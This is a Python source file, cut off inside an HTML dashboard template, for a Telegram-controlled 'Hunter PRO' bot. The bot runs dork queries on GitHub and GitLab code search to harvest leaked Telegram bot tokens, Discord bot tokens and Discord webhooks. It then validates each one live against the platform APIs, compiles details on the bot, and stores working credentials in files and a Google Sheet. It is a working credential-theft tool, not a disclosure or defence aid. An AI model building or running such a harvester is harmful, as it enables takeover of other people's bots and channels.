
import os
import re
import io
import csv
import html
import time
import json
import base64
import random
import urllib.parse
import threading
from typing import List, Dict, Optional, Tuple, Any
from datetime import datetime
from collections import Counter

try:
    from zoneinfo import ZoneInfo
    KYIV_TZ = ZoneInfo("Europe/Kyiv")
except Exception:
    KYIV_TZ = None

import requests
from requests.adapters import HTTPAdapter
import telebot
from telebot import types, apihelper
from flask import Flask, jsonify, render_template_string

import matplotlib
matplotlib.use("Agg")
import matplotlib.pyplot as plt

import gspread
from google.oauth2.service_account import Credentials


# =====================================================================
# НАСТРОЙКИ И КОНФИГУРАЦИЯ (Environment Variables)
# =====================================================================
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN", "").strip()
GITLAB_TOKEN = os.getenv("GITLAB_TOKEN", "").strip()
CONTROL_BOT_TOKEN = os.getenv("CONTROL_BOT_TOKEN", "").strip()
ADMIN_ID_RAW = os.getenv("ADMIN_ID", "0").strip()

try:
    ADMIN_ID = int(ADMIN_ID_RAW)
except ValueError:
    ADMIN_ID = 0

GOOGLE_CREDS_B64 = os.getenv("GOOGLE_CREDS_B64", "").strip()
GOOGLE_CREDS_JSON_RAW = os.getenv("GOOGLE_CREDS_JSON", "").strip()
SPREADSHEET_ID = os.getenv("SPREADSHEET_ID", "").strip()
SHEET_NAME = os.getenv("SHEET_NAME", "").strip()

SEEN_DB_FILE = os.getenv("SEEN_DB_FILE", "seen_tokens.txt")
LIVE_DB_FILE = os.getenv("LIVE_DB_FILE", "live_tokens.json")
MAX_LOG_LINES = 15
PER_TARGET_MAX_SEC = 2.4

if not CONTROL_BOT_TOKEN:
    raise RuntimeError("Не задана переменная окружения CONTROL_BOT_TOKEN!")

bot = telebot.TeleBot(CONTROL_BOT_TOKEN, threaded=True, num_threads=6)
app = Flask(__name__)

http_session = requests.Session()
_adapter = HTTPAdapter(pool_connections=16, pool_maxsize=16, max_retries=0)
http_session.mount("https://", _adapter)
http_session.mount("http://", _adapter)
http_session.headers.update({
    "User-Agent": "HunterPRO-Scanner/7.7 (+https://github.com)"
})


# =====================================================================
# ВРЕМЯ ПО КИЕВУ
# =====================================================================
def now_kyiv() -> datetime:
    if KYIV_TZ is not None:
        return datetime.now(KYIV_TZ)
    return datetime.now()


def kyiv_time_str(fmt: str = "%H:%M:%S") -> str:
    return now_kyiv().strftime(fmt)


# =====================================================================
# РЕГУЛЯРНЫЕ ВЫРАЖЕНИЯ, РЕЖИМЫ ОХОТЫ И СЛОВАРИ
# =====================================================================
TG_TOKEN_RE = re.compile(
    r"\b\d{8,10}:AA[A-Za-z0-9_-]{32}\b|\b\d{8,10}:[A-Za-z0-9_-]{35}\b"
)
DISCORD_TOKEN_RE = re.compile(
    r"[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}"
)
DISCORD_WEBHOOK_RE = re.compile(
    r"https://(?:ptb\.|canary\.)?discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+"
)

ALL_DORKS = [
    "BOT_TOKEN",
    "TELEGRAM_BOT_TOKEN",
    "bot_token",
    "api.telegram.org/bot",
    "DISCORD_TOKEN",
    "discord.com/api/webhooks",
]

TG_DORKS = [
    "BOT_TOKEN",
    "TELEGRAM_BOT_TOKEN",
    "bot_token",
    "api.telegram.org/bot",
    "TELEBOT_TOKEN",
]

DC_DORKS = [
    "DISCORD_TOKEN",
    "discord.com/api/webhooks",
    "DISCORD_BOT_TOKEN",
    "webhook_url",
]

CONFIG_DORKS = [
    "BOT_TOKEN",
    "TELEGRAM_BOT_TOKEN",
    "DISCORD_TOKEN",
    "discord.com/api/webhooks",
]

NOISE_FILTERS = "NOT example NOT sample NOT YOUR_TOKEN NOT token_here NOT placeholder"

TARGET_FILENAMES = [
    "",
    "filename:.env",
    "filename:config.py",
    "filename:settings.py",
    "filename:config.json",
    "filename:.js",
]

CONFIG_FILENAMES = [
    "filename:.env",
    "filename:config.py",
    "filename:settings.py",
    "filename:config.json",
    "filename:.env.example",
]

HUNT_MODES = {
    "all": "Всё подряд",
    "tg": "Только Telegram",
    "dc": "Только Discord / Webhooks",
    "env": "Фокус на .env / config",
}

HACKER_PHRASES = [
    "Сканирую GitHub и GitLab...",
    "Проверяю окна лимитов API...",
    "Анализирую фрагменты кода...",
    "Сверяю найденные ключи с базой...",
    "Проверяю webhook и активность ботов...",
    "Собираю досье по найденным целям...",
    "Фильтрую шаблоны и примеры...",
    "Обновляю телеметрию поиска...",
]

SPINNERS = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]

SCAM_KEYWORDS = [
    "support", "security", "crypto", "giveaway", "bonus",
    "airdrop", "check", "verify", "official", "help",
    "проверка", "гарант", "escrow", "drain", "stealer", "seed", "wallet"
]

FILTER_MODES = {
    "all": "Все живые",
    "no_scam": "Только не-скам",
    "tg_only": "Только Telegram",
}


# =====================================================================
# СОСТОЯНИЕ, ОЧЕРЕДИ РУЧНОЙ ПРОВЕРКИ И БЛОКИРОВКИ
# =====================================================================
db_lock = threading.RLock()
sheets_lock = threading.Lock()
state_lock = threading.Lock()
alert_lock = threading.Lock()

search_state: Dict[str, Any] = {
    "is_searching": False,
    "stop_requested": False,
    "limit_live": 5,
    "filter_mode": "all",
    "hunt_mode": "all",
    "found_live_current": 0,
    "skipped_by_filter": 0,
    "checked_tokens": 0,
    "dead_tokens": 0,
    "scam_tokens": 0,
    "tg_found": 0,
    "dc_found": 0,
    "wh_found": 0,
    "start_time": None,
    "current_query": "Ожидание запуска...",
    "status_text": "Ожидание...",
    "logs": [],
    "phrase": "Готов к работе",
}

awaiting_manual_check: Dict[int, float] = {}
sent_critical_alerts: set = set()

_cached_worksheet = None
_sheets_init_attempted = False
_sheets_last_error = ""


# =====================================================================
# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ И АЛЕРТЫ
# =====================================================================
def is_admin(chat_id: Optional[int], user_id: Optional[int] = None) -> bool:
    if ADMIN_ID <= 0:
        return True
    if chat_id == ADMIN_ID:
        return True
    if user_id is not None and user_id == ADMIN_ID:
        return True
    return False


def format_time(seconds: Optional[float]) -> str:
    if not seconds or seconds < 0:
        return "00:00:00"
    total = int(seconds)
    minutes, sec = divmod(total, 60)
    hours, minutes = divmod(minutes, 60)
    return f"{hours:02d}:{minutes:02d}:{sec:02d}"


def add_log(text: str, print_stdout: bool = True) -> None:
    time_str = kyiv_time_str("%H:%M:%S")
    clean_text = str(text).replace("\n", " ").strip()
    log_entry = f"[{time_str}] {clean_text}"
    with state_lock:
        search_state["logs"].append(log_entry)
        if len(search_state["logs"]) > MAX_LOG_LINES:
            search_state["logs"] = search_state["logs"][-MAX_LOG_LINES:]
    if print_stdout:
        print(log_entry, flush=True)


def set_status(status: str, query: Optional[str] = None) -> None:
    with state_lock:
        search_state["status_text"] = status
        if query is not None:
            search_state["current_query"] = query


def get_state_snapshot() -> Dict[str, Any]:
    with state_lock:
        elapsed = (
            time.time() - search_state["start_time"]
            if search_state["start_time"]
            else 0
        )
        return {
            "is_searching": search_state["is_searching"],
            "stop_requested": search_state["stop_requested"],
            "limit_live": search_state["limit_live"],
            "filter_mode": search_state["filter_mode"],
            "hunt_mode": search_state["hunt_mode"],
            "found_live_current": search_state["found_live_current"],
            "skipped_by_filter": search_state["skipped_by_filter"],
            "checked_tokens": search_state["checked_tokens"],
            "dead_tokens": search_state["dead_tokens"],
            "scam_tokens": search_state["scam_tokens"],
            "tg_found": search_state["tg_found"],
            "dc_found": search_state["dc_found"],
            "wh_found": search_state["wh_found"],
            "elapsed_seconds": elapsed,
            "time": format_time(elapsed),
            "current_query": search_state["current_query"],
            "status_text": search_state["status_text"],
            "logs": list(search_state["logs"]),
            "phrase": search_state["phrase"],
        }


def notify_critical_error(alert_key: str, title: str, details: str) -> None:
    add_log(f"🚨 {title}: {details}")
    with alert_lock:
        if alert_key in sent_critical_alerts:
            return
        sent_critical_alerts.add(alert_key)

    target_chat = ADMIN_ID if ADMIN_ID > 0 else None
    if not target_chat:
        return

    safe_title = html.escape(title)
    safe_details = html.escape(details)
    text = (
        f"🚨 <b>КРИТИЧЕСКОЕ ПРЕДУПРЕЖДЕНИЕ</b>\n\n"
        f"<b>{safe_title}</b>\n"
        f"<code>{safe_details}</code>\n\n"
        f"<i>Повторное оповещение по этой проблеме подавлено до перезапуска.</i>"
    )
    try:
        bot.send_message(
            target_chat,
            text,
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
    except Exception as send_err:
        print(f"[ALERT] Не удалось отправить алерт админу: {send_err}", flush=True)


def reset_critical_alert(alert_key: str) -> None:
    with alert_lock:
        sent_critical_alerts.discard(alert_key)


# =====================================================================
# GOOGLE SHEETS (КЭШИРОВАНИЕ + АЛЕРТЫ ПРИ ОШИБКАХ)
# =====================================================================
def _parse_google_credentials() -> Dict[str, Any]:
    if GOOGLE_CREDS_B64:
        raw_b64 = GOOGLE_CREDS_B64.strip()
        missing_padding = len(raw_b64) % 4
        if missing_padding:
            raw_b64 += "=" * (4 - missing_padding)
        try:
            decoded = base64.b64decode(raw_b64).decode("utf-8")
            return json.loads(decoded)
        except Exception as b64_err:
            try:
                return json.loads(GOOGLE_CREDS_B64)
            except Exception:
                raise ValueError(f"Ошибка декодирования GOOGLE_CREDS_B64: {b64_err}")

    if GOOGLE_CREDS_JSON_RAW:
        return json.loads(GOOGLE_CREDS_JSON_RAW)

    raise ValueError("Не заданы GOOGLE_CREDS_B64 или GOOGLE_CREDS_JSON")


def get_google_worksheet(force_reconnect: bool = False):
    global _cached_worksheet, _sheets_init_attempted, _sheets_last_error

    if not SPREADSHEET_ID:
        _sheets_last_error = "Не задан SPREADSHEET_ID"
        return None

    with sheets_lock:
        if _cached_worksheet is not None and not force_reconnect:
            return _cached_worksheet

        if _sheets_init_attempted and not force_reconnect and _sheets_last_error:
            return None

        _sheets_init_attempted = True
        try:
            creds_dict = _parse_google_credentials()
            scopes = [
                "https://www.googleapis.com/auth/spreadsheets",
                "https://www.googleapis.com/auth/drive",
            ]
            creds = Credentials.from_service_account_info(creds_dict, scopes=scopes)
            client = gspread.authorize(creds)
            spreadsheet = client.open_by_key(SPREADSHEET_ID)

            if SHEET_NAME:
                worksheet = spreadsheet.worksheet(SHEET_NAME)
            else:
                worksheet = spreadsheet.sheet1

            first_row = worksheet.row_values(1)
            if not first_row:
                worksheet.append_row([
                    "Время",
                    "Платформа",
                    "Имя / Цель",
                    "Токен / URL",
                    "Источник",
                    "Скам?",
                ])

            _cached_worksheet = worksheet
            _sheets_last_error = ""
            reset_critical_alert("sheets_error")
            add_log(f"☁️ Google Sheets подключён: '{spreadsheet.title}' -> '{worksheet.title}'")
            return _cached_worksheet

        except Exception as exc:
            _sheets_last_error = str(exc)
            notify_critical_error(
                "sheets_error",
                "Отвалился или не настроен Google Sheets",
                _sheets_last_error,
            )
            return None


def save_to_google_sheets(data: Dict[str, Any]) -> bool:
    if not SPREADSHEET_ID or (not GOOGLE_CREDS_B64 and not GOOGLE_CREDS_JSON_RAW):
        return False

    with sheets_lock:
        worksheet = get_google_worksheet(force_reconnect=False)
        if worksheet is None:
            return False

        timestamp = kyiv_time_str("%Y-%m-%d %H:%M:%S")
        row = [
            timestamp,
            str(data.get("type", "")),
            str(data.get("bot", "")),
            str(data.get("token", "")),
            str(data.get("url", "")),
            "Да" if data.get("scam") else "Нет",
        ]

        try:
            worksheet.append_row(row, value_input_option="USER_ENTERED")
            reset_critical_alert("sheets_write_error")
            add_log("☁️ Записано в Google Таблицу!")
            return True
        except Exception as exc:
            add_log(f"⚠️ Переподключаюсь к Google Sheets ({str(exc)[:30]})...")
            worksheet = get_google_worksheet(force_reconnect=True)
            if worksheet is not None:
                try:
                    worksheet.append_row(row, value_input_option="USER_ENTERED")
                    reset_critical_alert("sheets_write_error")
                    add_log("☁️ Записано в Google Таблицу после реконнекта!")
                    return True
                except Exception as retry_exc:
                    notify_critical_error(
                        "sheets_write_error",
                        "Ошибка записи строки в Google Sheets",
                        str(retry_exc),
                    )
                    return False
            return False


# =====================================================================
# БАЗА ДАННЫХ (seen_tokens.txt и live_tokens.json)
# =====================================================================
def load_seen_tokens() -> set:
    with db_lock:
        if not os.path.exists(SEEN_DB_FILE):
            return set()
        try:
            with open(SEEN_DB_FILE, "r", encoding="utf-8") as f:
                return {line.strip() for line in f if line.strip()}
        except Exception as exc:
            add_log(f"⚠️ Ошибка чтения {SEEN_DB_FILE}: {str(exc)[:30]}")
            return set()


def append_seen_token(token: str) -> None:
    if not token:
        return
    with db_lock:
        try:
            with open(SEEN_DB_FILE, "a", encoding="utf-8") as f:
                f.write(f"{token}\n")
        except Exception as exc:
            add_log(f"⚠️ Ошибка записи в {SEEN_DB_FILE}: {str(exc)[:30]}")


def clear_seen_tokens() -> None:
    with db_lock:
        try:
            with open(SEEN_DB_FILE, "w", encoding="utf-8") as f:
                f.write("")
        except Exception as exc:
            add_log(f"⚠️ Ошибка очистки {SEEN_DB_FILE}: {str(exc)[:30]}")


def load_live_tokens() -> List[Dict[str, Any]]:
    with db_lock:
        if not os.path.exists(LIVE_DB_FILE):
            return []
        try:
            with open(LIVE_DB_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                return data if isinstance(data, list) else []
        except Exception as exc:
            add_log(f"⚠️ Ошибка чтения {LIVE_DB_FILE}: {str(exc)[:30]}")
            return []


def save_live_token(token_data: Dict[str, Any]) -> bool:
    added = False
    with db_lock:
        live_list = []
        if os.path.exists(LIVE_DB_FILE):
            try:
                with open(LIVE_DB_FILE, "r", encoding="utf-8") as f:
                    loaded = json.load(f)
                    if isinstance(loaded, list):
                        live_list = loaded
            except Exception:
                live_list = []

        if not any(item.get("token") == token_data.get("token") for item in live_list):
            enriched = dict(token_data)
            enriched.setdefault("found_at", kyiv_time_str("%Y-%m-%d %H:%M:%S"))
            live_list.append(enriched)
            try:
                with open(LIVE_DB_FILE, "w", encoding="utf-8") as f:
                    json.dump(live_list, f, ensure_ascii=False, indent=4)
                added = True
            except Exception as exc:
                add_log(f"❌ Ошибка сохранения {LIVE_DB_FILE}: {str(exc)[:30]}")

    if added:
        threading.Thread(
            target=save_to_google_sheets,
            args=(token_data,),
            daemon=True,
        ).start()
    return added


# =====================================================================
# ПРОВЕРКА ТОКЕНОВ И ВЕБХУКОВ (СТРОГИЙ ТАЙМАУТ НА КАЖДУЮ ЦЕЛЬ)
# =====================================================================
def _probe_json(
    url: str,
    headers: Optional[Dict[str, str]] = None,
    connect_t: float = 1.2,
    read_t: float = 1.5,
) -> Tuple[int, Optional[Dict[str, Any]], Optional[str]]:
    try:
        resp = http_session.get(
            url,
            headers=headers,
            timeout=(connect_t, read_t),
        )
        if resp.status_code != 200:
            return resp.status_code, None, f"HTTP {resp.status_code}"
        try:
            return 200, resp.json(), None
        except Exception:
            return 200, None, "bad json"
    except requests.Timeout:
        return 0, None, "таймаут"
    except requests.ConnectionError:
        return 0, None, "нет связи"
    except Exception as exc:
        return 0, None, str(exc)[:22]


def _inspect_telegram_once(token: str) -> Tuple[bool, Optional[str], bool, str, Optional[str]]:
    code, payload, err = _probe_json(
        f"https://api.telegram.org/bot{token}/getMe",
        connect_t=1.2,
        read_t=1.5,
    )
    if code != 200 or not isinstance(payload, dict):
        return False, None, False, "", err or f"HTTP {code}"

    if not (payload.get("ok") and isinstance(payload.get("result"), dict)):
        return False, None, False, "", "невалидный"

    result = payload["result"]
    username = result.get("username") or result.get("first_name") or "UnknownBot"
    first_name = str(result.get("first_name", "")).lower()
    is_scam = any(
        word in first_name or word in str(username).lower()
        for word in SCAM_KEYWORDS
    )

    desc_text = "Нет описания"
    cmds_text = "Нет команд"
    wh_text = "Webhook не задан"

    _, d_data, _ = _probe_json(
        f"https://api.telegram.org/bot{token}/getMyDescription",
        connect_t=0.8,
        read_t=1.0,
    )
    if isinstance(d_data, dict) and isinstance(d_data.get("result"), dict):
        raw_desc = d_data["result"].get("description")
        if raw_desc:
            desc_text = html.escape(str(raw_desc).strip()[:200])

    _, c_data, _ = _probe_json(
        f"https://api.telegram.org/bot{token}/getMyCommands",
        connect_t=0.8,
        read_t=1.0,
    )
    if isinstance(c_data, dict) and isinstance(c_data.get("result"), list):
        parsed = [
            html.escape(f"/{c.get('command', '')}")
            for c in c_data["result"][:10]
            if isinstance(c, dict) and c.get("command")
        ]
        if parsed:
            cmds_text = ", ".join(parsed)

    _, wh_data, _ = _probe_json(
        f"https://api.telegram.org/bot{token}/getWebhookInfo",
        connect_t=0.8,
        read_t=1.0,
    )
    if isinstance(wh_data, dict) and isinstance(wh_data.get("result"), dict):
        wh_res = wh_data["result"]
        wh_url = str(wh_res.get("url") or "").strip()
        pending = int(wh_res.get("pending_update_count") or 0)
        last_err = str(wh_res.get("last_error_message") or "").strip()
        if wh_url:
            wh_text = f"<code>{html.escape(wh_url[:90])}</code> (очередь: {pending})"
            if last_err:
                wh_text += f"\n⚠️ <b>Ошибка WH:</b> <code>{html.escape(last_err[:90])}</code>"
        else:
            wh_text = f"Не задан (очередь: {pending})"

    dossier = (
        f"📝 <b>Био:</b> {desc_text}\n"
        f"📜 <b>Команды:</b> {cmds_text}\n"
        f"🌐 <b>Webhook:</b> {wh_text}"
    )
    return True, str(username), is_scam, dossier, None


def _inspect_discord_token_once(token: str) -> Tuple[bool, Optional[str], bool, str, Optional[str]]:
    code, data, err = _probe_json(
        "https://discord.com/api/v10/users/@me",
        headers={"Authorization": f"Bot {token}"},
        connect_t=1.2,
        read_t=1.5,
    )
    if code == 200 and isinstance(data, dict):
        username = data.get("username") or "DiscordBot"
        discriminator = data.get("discriminator")
        display_name = (
            f"{username}#{discriminator}"
            if discriminator and discriminator != "0"
            else str(username)
        )
        is_scam = any(word in display_name.lower() for word in SCAM_KEYWORDS)
        return True, display_name, is_scam, "🤖 Discord Bot Token активен", None
    return False, None, False, "", err or f"HTTP {code}"


def _inspect_discord_webhook_once(webhook_url: str) -> Tuple[bool, Optional[str], bool, str, Optional[str]]:
    code, data, err = _probe_json(
        webhook_url,
        connect_t=1.2,
        read_t=1.5,
    )
    if code == 200 and isinstance(data, dict):
        name = data.get("name") or "Webhook"
        ch_id = data.get("channel_id")
        label = f"{name} (ch:{ch_id})" if ch_id else str(name)
        return True, label, True, "🪝 Активный Discord Webhook", None
    return False, None, False, "", err or f"HTTP {code}"


def _probe_worker(
    f_type: str,
    target: str,
    out_slot: List[Tuple[bool, Optional[str], bool, str, Optional[str]]],
) -> None:
    try:
        if f_type == "Telegram":
            res = _inspect_telegram_once(target)
        elif f_type == "Discord":
            res = _inspect_discord_token_once(target)
        elif f_type == "Webhook":
            res = _inspect_discord_webhook_once(target)
        else:
            res = (False, None, False, "", "unknown type")
        if not out_slot:
            out_slot.append(res)
    except Exception as exc:
        if not out_slot:
            out_slot.append((False, None, False, "", str(exc)[:22]))


def check_finding_bounded(
    f_type: str, target: str, max_sec: float = PER_TARGET_MAX_SEC
) -> Tuple[bool, Optional[str], bool, str, Optional[str]]:
    out_slot: List[Tuple[bool, Optional[str], bool, str, Optional[str]]] = []
    worker = threading.Thread(
        target=_probe_worker,
        args=(f_type, target, out_slot),
        daemon=True,
    )
    worker.start()
    worker.join(timeout=max_sec)

    if out_slot:
        return out_slot[0]
    return False, None, False, "", f"таймаут {max_sec:.1f}с"


def manual_check_target(raw_input: str) -> Tuple[str, Optional[Dict[str, Any]]]:
    cleaned = raw_input.strip()

    wh_match = DISCORD_WEBHOOK_RE.search(cleaned)
    tg_match = TG_TOKEN_RE.search(cleaned)
    dc_match = DISCORD_TOKEN_RE.search(cleaned)

    if wh_match:
        target = wh_match.group(0).strip()
        f_type = "Webhook"
    elif tg_match:
        target = tg_match.group(0).strip()
        f_type = "Telegram"
    elif dc_match:
        target = dc_match.group(0).strip()
        f_type = "Discord"
    else:
        return (
            "⚠️ <b>Не удалось распознать ключ или webhook.</b>\n"
            "Пришли формат Telegram-токена (<code>123456789:AA...</code>), "
            "Discord Bot Token или ссылку <code>https://discord.com/api/webhooks/...</code>.",
            None,
        )

    is_live, label, is_scam, dossier, err_reason = check_finding_bounded(
        f_type, target, max_sec=4.0
    )

    safe_type = html.escape(f_type)
    safe_target = html.escape(target)
    safe_label = html.escape(str(label or "Неизвестно"))

    if not is_live:
        reason_line = f"\nПричина: <code>{html.escape(err_reason)}</code>" if err_reason else ""
        report = (
            f"🧪 <b>Ручная проверка ({safe_type})</b>\n\n"
            f"🔑 Цель: <code>{safe_target}</code>\n"
            f"📡 Статус: ❌ <b>МЁРТВЫЙ / НЕАКТИВЕН</b>{reason_line}"
        )
        return report, None

    scam_badge = "⚠️ СКАМ / ПОДОЗРИТЕЛЬНО" if is_scam else "✅ НОРМ"
    report = (
        f"🧪 <b>Ручная проверка ({safe_type})</b>\n\n"
        f"📡 Статус: 🟢 <b>ЖИВОЙ / АКТИВЕН</b>\n"
        f"🏷 Оценка: <b>{scam_badge}</b>\n"
        f"🤖 Имя / Цель: <b>{safe_label}</b>\n"
        f"🔑 Ключ: <code>{safe_target}</code>\n\n"
        f"📄 <b>Досье:</b>\n{dossier}"
    )

    token_info = {
        "type": f_type,
        "token": target,
        "repo": "manual/check",
        "url": "manual-check",
        "bot": label or "Unknown",
        "scam": is_scam,
    }
    return report, token_info


def _allowed_by_hunt_mode(platform: str, hunt_mode: str) -> bool:
    if hunt_mode == "tg":
        return platform == "Telegram"
    if hunt_mode == "dc":
        return platform in ("Discord", "Webhook")
    return True


def extract_findings_from_text(
    text: str,
    repo_full_name: str,
    html_url: str,
    seen_tokens: set,
    hunt_mode: str = "all",
) -> List[Dict[str, str]]:
    if not text:
        return []

    found: List[Dict[str, str]] = []
    seen_in_batch = set()

    patterns = [
        ("Telegram", TG_TOKEN_RE),
        ("Discord", DISCORD_TOKEN_RE),
        ("Webhook", DISCORD_WEBHOOK_RE),
    ]

    for platform, regex in patterns:
        if not _allowed_by_hunt_mode(platform, hunt_mode):
            continue
        for match in regex.findall(text):
            candidate = match.strip()
            if not candidate:
                continue
            if candidate in seen_tokens or candidate in seen_in_batch:
                continue
            seen_in_batch.add(candidate)
            found.append({
                "type": platform,
                "token": candidate,
                "repo": repo_full_name,
                "url": html_url,
            })

    return found


# =====================================================================
# ПОИСК: GITHUB И GITLAB (С УЧЁТОМ РЕЖИМА ОХОТЫ)
# =====================================================================
def _sleep_respecting_stop(seconds: float) -> None:
    deadline = time.time() + max(0.0, seconds)
    while time.time() < deadline:
        with state_lock:
            if search_state["stop_requested"]:
                break
        time.sleep(0.5)


def _build_search_query(hunt_mode: str) -> str:
    if hunt_mode == "tg":
        base = random.choice(TG_DORKS)
        lang = random.choice(["python", "javascript", "php", "go", "json", ""])
        file_filter = random.choice(TARGET_FILENAMES)
    elif hunt_mode == "dc":
        base = random.choice(DC_DORKS)
        lang = random.choice(["javascript", "typescript", "python", "json", ""])
        file_filter = random.choice(TARGET_FILENAMES)
    elif hunt_mode == "env":
        base = random.choice(CONFIG_DORKS)
        lang = ""
        file_filter = random.choice(CONFIG_FILENAMES)
    else:
        base = random.choice(ALL_DORKS)
        lang = random.choice(["python", "javascript", "typescript", "php", "go", "json", ""])
        file_filter = random.choice(TARGET_FILENAMES)

    parts = [base, NOISE_FILTERS, "in:file"]
    if lang:
        parts.append(f"language:{lang}")
    if file_filter:
        parts.append(file_filter)
    return " ".join(parts)


def search_github_dynamic() -> Tuple[List[Dict[str, str]], int]:
    if not GITHUB_TOKEN:
        notify_critical_error(
            "github_missing_token",
            "Отсутствует GITHUB_TOKEN",
            "Переменная окружения GITHUB_TOKEN пуста — поиск по GitHub отключён.",
        )
        _sleep_respecting_stop(6)
        return [], 401

    with state_lock:
        hunt_mode = search_state["hunt_mode"]

    findings: List[Dict[str, str]] = []
    seen_tokens = load_seen_tokens()

    query = _build_search_query(hunt_mode)
    set_status(search_state["status_text"], f"GitHub [{HUNT_MODES.get(hunt_mode, hunt_mode)}]: {query}")

    headers = {
        "Accept": "application/vnd.github.text-match+json",
        "Authorization": f"Bearer {GITHUB_TOKEN}",
        "X-GitHub-Api-Version": "2022-11-28",
    }
    params = {
        "q": query,
        "per_page": 30,
        "page": random.randint(1, 2),
        "sort": "indexed",
        "order": "desc",
    }

    try:
        resp = http_session.get(
            "https://api.github.com/search/code",
            headers=headers,
            params=params,
            timeout=(2.5, 6.0),
        )

        if resp.status_code == 401:
            set_status("❌ Ошибка авторизации GitHub Token!")
            notify_critical_error(
                "github_401",
                "Слетел или невалиден GITHUB_TOKEN (HTTP 401)",
                "GitHub API отклонил токен. Обнови GITHUB_TOKEN в переменных окружения.",
            )
            with state_lock:
                search_state["stop_requested"] = True
            return [], 401

        if resp.status_code in (403, 429):
            reset_ts = resp.headers.get("X-RateLimit-Reset")
            wait_sec = 60
            if reset_ts and reset_ts.isdigit():
                calc = int(reset_ts) - int(time.time()) + 2
                wait_sec = max(5, min(calc, 180))
            set_status(f"⚠️ Лимит GitHub API. Пауза {wait_sec}с")
            add_log(f"⏳ Rate limit GitHub ({resp.status_code}). Жду {wait_sec} сек.")
            _sleep_respecting_stop(wait_sec)
            return [], resp.status_code

        resp.raise_for_status()
        reset_critical_alert("github_401")
        items = resp.json().get("items") or []

        for item in items:
            repo_name = (item.get("repository") or {}).get("full_name") or "unknown/repo"
            html_url = item.get("html_url") or "https://github.com"
            fragments = []
            for m in item.get("text_matches") or []:
                frag = m.get("fragment")
                if frag:
                    fragments.append(frag)

            combined = "\n".join(fragments)
            extracted = extract_findings_from_text(
                combined, repo_name, html_url, seen_tokens, hunt_mode=hunt_mode
            )
            for item_found in extracted:
                append_seen_token(item_found["token"])
                seen_tokens.add(item_found["token"])
                findings.append(item_found)

        add_log(f"📦 GitHub нашёл кандидатов: {len(findings)}")
        _sleep_respecting_stop(7)
        return findings, 200

    except requests.RequestException as exc:
        add_log(f"⚠️ Сетевая ошибка GitHub: {str(exc)[:45]}")
        _sleep_respecting_stop(7)
        return [], 500
    except Exception as exc:
        add_log(f"❌ Ошибка парсинга GitHub: {str(exc)[:45]}")
        _sleep_respecting_stop(7)
        return [], 500


def search_gitlab() -> List[Dict[str, str]]:
    if not GITLAB_TOKEN:
        return []

    with state_lock:
        hunt_mode = search_state["hunt_mode"]

    if hunt_mode == "tg":
        query = random.choice(["BOT_TOKEN", "TELEGRAM_BOT_TOKEN", "api.telegram.org/bot"])
    elif hunt_mode == "dc":
        query = random.choice(["DISCORD_TOKEN", "discord.com/api/webhooks"])
    else:
        query = random.choice(["BOT_TOKEN", "api.telegram.org/bot", "discord.com/api/webhooks"])

    findings: List[Dict[str, str]] = []
    seen_tokens = load_seen_tokens()
    set_status(search_state["status_text"], f"GitLab: {query}")

    headers = {"PRIVATE-TOKEN": GITLAB_TOKEN}
    params = {"scope": "blobs", "search": query, "per_page": 8}

    try:
        resp = http_session.get(
            "https://gitlab.com/api/v4/search",
            headers=headers,
            params=params,
            timeout=(2.5, 5.0),
        )
        if resp.status_code == 401:
            notify_critical_error(
                "gitlab_401",
                "Слетел или невалиден GITLAB_TOKEN (HTTP 401)",
                "GitLab API вернул 401 Unauthorized. Проверь токен GitLab.",
            )
            return []
        if resp.status_code != 200:
            return []

        reset_critical_alert("gitlab_401")
        blobs = resp.json()
        if not isinstance(blobs, list):
            return []

        for blob in blobs[:5]:
            with state_lock:
                if search_state["stop_requested"]:
                    break

            project_id = blob.get("project_id")
            file_path = blob.get("path") or blob.get("filename")
            ref = blob.get("ref") or "main"

            if not project_id or not file_path:
                continue

            encoded_path = urllib.parse.quote(file_path, safe="")
            raw_url = (
                f"https://gitlab.com/api/v4/projects/{project_id}/repository/files/"
                f"{encoded_path}/raw"
            )
            try:
                raw_resp = http_session.get(
                    raw_url,
                    headers=headers,
                    params={"ref": ref},
                    timeout=(1.5, 2.5),
                )
                if raw_resp.status_code != 200:
                    continue

                content = raw_resp.text[:150000]
                web_url = f"https://gitlab.com/{project_id}/-/blob/{ref}/{file_path}"
                extracted = extract_findings_from_text(
                    content,
                    f"gitlab/{project_id}",
                    web_url,
                    seen_tokens,
                    hunt_mode=hunt_mode,
                )
                for item_found in extracted:
                    append_seen_token(item_found["token"])
                    seen_tokens.add(item_found["token"])
                    findings.append(item_found)
            except Exception:
                continue

    except Exception as exc:
        add_log(f"⚠️ Ошибка GitLab: {str(exc)[:45]}")

    return findings


# =====================================================================
# ГРАФИКИ СТАТИСТИКИ
# =====================================================================
def generate_stats_chart() -> io.BytesIO:
    snap = get_state_snapshot()
    live_saved = len(load_live_tokens())

    live_count = (
        max(snap["found_live_current"], live_saved)
        if snap["found_live_current"] == 0
        else snap["found_live_current"]
    )
    dead_count = snap["dead_tokens"]
    scam_count = snap["scam_tokens"]

    labels = ["Живые", "Мёртвые", "Скам"]
    sizes = [live_count, dead_count, scam_count]
    colors = ["#00ff88", "#ff4d4d", "#ffb703"]

    if sum(sizes) == 0:
        sizes = [1]
        labels = ["Нет данных"]
        colors = ["#3a3f4b"]

    fig, ax = plt.subplots(figsize=(6, 4), facecolor="#14171f")
    ax.set_facecolor("#14171f")

    ax.pie(
        sizes,
        labels=labels,
        colors=colors,
        autopct="%1.1f%%",
        textprops={"color": "#f0f6fc", "fontweight": "bold", "fontsize": 10},
        startangle=140,
    )
    ax.set_title(
        "Статистика поиска (Hunter PRO)",
        color="#00ff88",
        fontweight="bold",
        fontsize=12,
        pad=12,
    )

    buf = io.BytesIO()
    plt.tight_layout()
    plt.savefig(buf, format="png", facecolor="#14171f", dpi=130)
    buf.seek(0)
    plt.close(fig)
    return buf


# =====================================================================
# FLASK ВЕБ-ДАШБОРД И API УПРАВЛЕНИЯ
# =====================================================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="utf-8">
    <title>Hunter PRO Dashboard</title>
